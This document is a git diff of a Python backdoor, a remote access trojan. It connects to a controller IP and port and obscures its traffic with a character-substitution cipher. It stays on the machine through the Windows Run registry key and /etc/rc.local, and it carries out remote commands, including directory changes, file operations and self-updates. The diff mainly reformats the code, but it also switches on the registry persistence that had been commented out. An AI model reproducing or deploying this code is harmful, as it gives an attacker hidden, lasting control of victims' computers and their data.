@@ -1,5 +1,3 @@
-#rc.local = /etc/rc.local
-
 try:
     import os
     import socket
@@ -10,15 +8,19 @@ except:
     os.system("pip install time")
     os.system("pip3 install time")
 
-encrypted = list("""í4i;aA\oà?QnwjROPÇèÌ_W)y'$M05K"È}bÆeÉá37ZçÔ.YJf+]9:m-%~XxÓTrEv|1p!{8l»Dq&Sd(Í# ,F‡Õg<ãVéÿâ>t[^óhìòGzk/U=«sÀCNÁ*BHuÒ6Âõ2'ÃIôcL""")
-decrypted = list("""ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890!#$%&/=?*+~^-_«»'<>\| {[()]}áàÁÀãÃâÂçÇéÉÈèíÍÌìóÓòÒõÕôÔ:.,;"'ÿ‡Æ""")
+encrypted = list(
+    """í4i;aA\oà?QnwjROPÇèÌ_W)y'$M05K"È}bÆeÉá37ZçÔ.YJf+]9:m-%~XxÓTrEv|1p!{8l»Dq&Sd(Í# ,F‡Õg<ãVéÿâ>t[^óhìòGzk/U=«sÀCNÁ*BHuÒ6Âõ2'ÃIôcL""")
+decrypted = list(
+    """ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890!#$%&/=?*+~^-_«»'<>\| {[()]}áàÁÀãÃâÂçÇéÉÈèíÍÌìóÓòÒõÕôÔ:.,;"'ÿ‡Æ""")
 
 connected = False
 persistence_status = "Enabled" if "AppData" in os.getcwd() or "/etc/rc.local" in os.getcwd() else "Disabled"
 
 ##### VARIABLES #####
-server = "192.168.1.103" ##### Var
-port = 23125 #### Var
+server = "192.168.1.103"  ##### Var
+port = 23125  #### Var
+
+
 ##### VARIABLES #####
 
 def encrypt(string):
@@ -31,6 +33,7 @@ def encrypt(string):
             final += encrypted[n]
     return final
 
+
 def decrypt(string):
     final = ""
     for i in list(string):
@@ -41,24 +44,28 @@ def decrypt(string):
             final += decrypted[n]
     return final
 
-#try: #### DEBUGGING ####
+
+#try: DEBUGGING ########################################
 if True:
 
     def recive(buffer):
         return decrypt(server_connection.recv(buffer).decode("utf-8"))
-    
+
+
     def send(str):
         server_connection.send(encrypt(str).encode("utf-8"))
+
 
     def recive_buffer(buffer):
         bff = recive(buffer)
         if bff.startswith("#"):
-            buff = int(bff.split("#")[1])*2
+            buff = int(bff.split("#")[1]) * 2
             condition_msg = True
             while condition_msg:
                 msg = recive(buff)
                 condition_msg = False
             return msg
+
 
     def send_buffer(string):
         try:
@@ -69,19 +76,21 @@ if True:
         except:
             pass
 
+
     ########## PERSISTENCE/START OF PRIVILLEGE ESCALATION ##########
 
-    def persistence_windows_1():
-        try:######################## DEBUGGING #########################
-            #a = os.popen('REG ADD HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v PyApp /t REG_SZ /d "C:\\Windows\\Users\\wi6n3l\\Desktop\\PyBackdoor\\backdoor.py')
+    def persistence_windows_1(name=os.path.basename(__file__)):
+        try:  ######################## DEBUGGING #########################
+            a = os.popen(
+                'REG ADD HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v ' + name + ' /t REG_SZ /d "%appdata%\\Microsoft\\' + name)
             return True
         except PermissionError:
             return False
 
 
-    def persistence_linux_1():
+    def persistence_linux_1(name=os.path.basename(__file__)):
         try:
-            file_name = os.path.basename(__file__)
+            file_name = name
             with open("/etc/rc.local") as file:
                 old = file.readlines()
                 old[len(old) - 1] = "python3 {}/.{}".format(os.path.expanduser("~"), file_name)
@@ -96,8 +105,8 @@ if True:
             return False
 
 
-    def persistence_linux_2():
-        file_name = os.path.basename(__file__)
+    def persistence_linux_2(name=os.path.basename(__file__)):
+        file_name = name
         try:
             persistence = open(".percistence.py", "w")
             persistence.write("""import os
@@ -120,6 +129,7 @@ if True:
         except PermissionError:
             return False
 
+
     def persistence(file="self"):
         if file == "self":
             file_name = os.path.basename(__file__)
@@ -128,28 +138,25 @@ if True:
         current_os = "windows" if os.popen("ls").read() == "" else "linux"
         if current_os == "windows":
             os.popen('copy "{}" "%appdata%\\Microsoft\\{}"'.format(file_name, file_name)).read()
-            if persistence_windows_1():
+            if persistence_windows_1(file_name):
                 persistence_status = "Enabled"
             else:
                 persistence_status = "Disabled (Permission Error)"
         elif current_os == "linux":
             os.popen('cp "{}" "{}/.{}"'.format(file_name, os.path.expanduser("~"), file_name))
-            if persistence_linux_1():
-                persistence_status = "Enabled"
+            if persistence_linux_1(file_name):
                 send_buffer("Enabled")
             else:
                 send_buffer("Disabled (Permission Error)")
-                persistence_status = "Disabled (Permission Error)"
-                if persistence_linux_2():
-                    persistence_status = "Enabled"
+                if persistence_linux_2(file_name):
                     send_buffer("Enabled")
                 else:
                     send_buffer("Disabled (Permission Error)")
-                    persistence_status = "Disabled (Permission Error)"
+
 
     persistence()
 
-########### SERVER CONNECTION START ##########
+    ########### SERVER CONNECTION START ##########
 
     server_connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     while True:
@@ -173,26 +180,27 @@ if True:
     if status == "200":
         send_buffer(response)
 
-########## START OF FUNCIONALITY DEFENITIONS ##########
+
+    ########## START OF FUNCIONALITY DEFENITIONS ##########
 
     def get_dir():
         return os.getcwd()
 
 
-########## END OF FUNCIONALITY DEFENITIONS ##########
+    ########## END OF FUNCIONALITY DEFENITIONS ##########
 
-########## COMMAND RECIVING AND PROCESSIG #########
+    ########## COMMAND RECIVING AND PROCESSIG #########
     condition = True
     while condition:
         request = recive_buffer(1024)
-##### PERCISTECNE COMMAND #####
+        ##### PERCISTECNE COMMAND #####
         if request.startswith("{persistence}"):
             if request.split("-")[1] == "s":
                 send_buffer(persistence_status)
             elif request.split("-")[1] == "r":
                 persistence()
                 send_buffer("Result: Persistence " + persistence_status)
-##### CHDIR COMMAND #####
+        ##### CHDIR COMMAND #####
         elif request.startswith("{chdir}"):
             dir = request.split("}", 1)[1]
             try:
@@ -200,19 +208,19 @@ if True:
                 send_buffer("{sucess}" + get_dir())
             except FileNotFoundError:
                 send_buffer("{error}Invalid dir")
-##### CODE UPDATE COMMAND #####
+        ##### CODE UPDATE COMMAND #####
         elif request.startswith("{codeupdate"):
             extension = "." + request.split("}", 1)[0].split(" ", 1)[1]
             with open(".update" + extension, "w") as file:
                 file.write(request.split("}", 1)[1])
             persistence(".update" + extension)
-            os.remove(".update" + extension) if persistence_status == "Enable" else send_buffer("Failed to enable persistence on update")
-
-##### COMMAND CHECK #####
+            os.remove(".update.py")
+            os.remove(".update" + extension) if persistence_status == "Enabled" else send_buffer(
+                "Failed to enable persistence on update")
+        ##### COMMAND CHECK #####
         elif request.startswith("{command}"):
             command = request.split("}", 1)[1]
-            #try:
-            if True:
+            try:
                 if command.startswith("mkdir"):
                     try:
                         response = os.mkdir(command.split(" ", 1)[1])
@@ -244,28 +252,12 @@ if True:
                         send_buffer("{error}")
                     else:
                         send_buffer("{sucess}" + response)
-            #except:
-             #   send_buffer("{error}")
+            except:
+                send_buffer("{error}")
+#except: DEBUGGING ########################################
+ #   pass DEBUGGING ########################################
 
-
-
-
-
-
-
-
-
-
-
-
-#except Exception as e:##DEBUGING # except:
- #   print(e)##DEBUGING COMMENT
-  #  pass
-
-
-
-
-try:
-    server_connection.close()
-except:
-    pass
+#try: DEBUGGING ########################################
+ #   server_connection.close() DEBUGGING ########################################
+#except: DEBUGGING ########################################
+  #  pass DEBUGGING ########################################
